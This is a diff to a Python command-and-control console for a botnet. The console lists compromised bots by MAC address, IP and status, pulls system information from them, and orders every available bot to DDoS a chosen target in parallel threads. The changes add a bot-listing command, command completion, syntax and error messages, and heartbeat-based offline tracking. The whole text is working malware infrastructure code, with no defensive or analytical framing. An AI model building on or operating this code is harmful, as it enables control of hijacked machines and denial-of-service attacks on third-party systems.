@@ -5,6 +5,7 @@ import threading
 import sqlite3
 import logging
 import requests
+import os
 import cmd
 import re
 import time
@@ -21,6 +22,7 @@ def main():
     log = logging.getLogger('werkzeug')
     log.disabled = True
     threading.Thread(target = lambda: checkHeartBeat()).start()
+    os.system("clear")
     CommandShell().cmdloop()
 
 class BotStatus(str, Enum):
@@ -29,11 +31,36 @@ class BotStatus(str, Enum):
     RUNNING = "running"
 
 class CommandShell(cmd.Cmd):
-    intro = 'CNC started. Type help or ? to list commands.'
-    prompt = '(CNC)> '
+    intro = 'C&C started. Type help or ? to list commands.'
+    prompt = '(C&C)> '
+
+    def do_listbots(self, args):
+        'List all bots with the relative statuses.\nSyntax: listbots [online/available/all, default = all]'
+        def printBots(bots):
+            if (bots):
+                for bot in bots:
+                    print(f"[{bot['mac_address']}]: \n\tStatus: {bot['status']}\n\tListening Address: http://{bot['ip_address']}:{bot['listening_port']}\n\tLast Executed Task: {bot['last_task']}\n\tLast Executed Task Timestamp: {bot['last_task_timestamp']}\n\tTarget: {bot['last_target']}")
+        args = split_string(args)
+        if args:
+            match (args[0]):
+                case "online":
+                    printBots(db.getAllOnlineBots())
+                case "available":
+                    printBots(db.getAllAvailableBots())
+                case "all":
+                   printBots(db.getAllBots())
+                case _:
+                    print("Subcommands: online, available, all")
+        else:
+            printBots(db.getAllBots())
+
+    def complete_listbots(self, text, line, begidx, endidx):
+        subcommands = ["online", "available", "all"]
+        completitions = [command for command in subcommands if command.startswith(text)]
+        return completitions
     
     def do_systeminfo(self, args):
-        'Get the system informations of the connected bots or just a single one.'
+        'Get the system informations of the connected bots or just a single one.\nSyntax: systeminfo [MAC Address]'
         def getSystemInfo(client):
             try:
                 db.updateLastTask("systeminfo", None, client['mac_address'], BotStatus.RUNNING)
@@ -59,33 +86,14 @@ class CommandShell(cmd.Cmd):
                 for bot in bots:
                     getSystemInfo(bot)
 
-    def do_listbots(self, args):
-        'List all bots with the relative statuses.'
-        def printBots(bots):
-            if (bots):
-                for bot in bots:
-                    print(f"[{bot['mac_address']}]: \n\tStatus: {bot['status']}\n\tListening Address: http://{bot['ip_address']}:{bot['listening_port']}\n\tLast Executed Task: {bot['last_task']}\n\tLast Executed Task Timestamp: {bot['last_task_timestamp']}\n\tTarget: {bot['last_target']}")
-        args = split_string(args)
-        if args:
-            match (args[0]):
-                case "online":
-                    printBots(db.getAllOnlineBots())
-                case "available":
-                    printBots(db.getAllAvailableBots())
-                case "all":
-                   printBots(db.getAllBots())
-                case _:
-                    print("Subcommands: online, available, all")
-        else:
-            print("Subcommands: online, available, all")
-    
-    def complete_listbots(self, text, line, begidx, endidx):
-        subcommands = ["online", "available", "all"]
-        completitions = [command for command in subcommands if command.startswith(text)]
+    def complete_systeminfo(self, text, line, begidx, endidx):
+        bots = db.getAllOnlineBots()
+        botList = [bot['mac_address'] for bot in bots] if bots is not None else []
+        completitions = [bot for bot in botList if bot.startswith(text)]
         return completitions
     
     def do_ddos(self, args):
-        'DDOSl a target with all available bots (default 10 seconds).'
+        'DDOS a target with all available bots (default 10 seconds)\nSyntax: ddos <target> [seconds]'
         def ddos(bot, body):
             try:
                 db.updateLastTask("ddos", body['url'], bot['mac_address'], BotStatus.RUNNING)
@@ -95,6 +103,7 @@ class CommandShell(cmd.Cmd):
                 print(f"{bot['mac_address']} is offline.")
                 db.updateLastTask("failed_systeminfo", None, bot['mac_address'], BotStatus.OFFLINE)
             except Exception:
+                print(f"{bot['mac_address']} DDOS failed.")
                 db.updateLastTask("failed_ddos", body['url'], bot['mac_address'], BotStatus.ONLINE)
         args = split_string(args)
 
@@ -108,6 +117,10 @@ class CommandShell(cmd.Cmd):
             if bots:
                 for bot in bots:
                     threading.Thread(target = lambda: ddos(bot, body)).start()
+            else:
+                print("Nessun bot disponibile.")
+        else:
+            print("Syntax: ddos <target> [seconds]")
             
 
 
@@ -196,7 +209,7 @@ class DB:
         self.execute("UPDATE bots SET last_task = ?, last_target = ?, last_task_timestamp = CURRENT_TIMESTAMP, status = ? WHERE mac_address = ?", name, target, status, macaddr)
     
     def setOfflineHeartBeat(self):
-        self.execute("UPDATE bots SET status = 'offline' WHERE ((julianday(CURRENT_TIMESTAMP) - julianday(last_heartbeat)) * 86400) > 120")
+        self.execute("UPDATE bots SET status = ? WHERE status IN (?, ?) AND ((julianday(CURRENT_TIMESTAMP) - julianday(last_heartbeat)) * 86400) > 120", BotStatus.OFFLINE, BotStatus.ONLINE, BotStatus.RUNNING)
 
 def checkHeartBeat():
     while True:
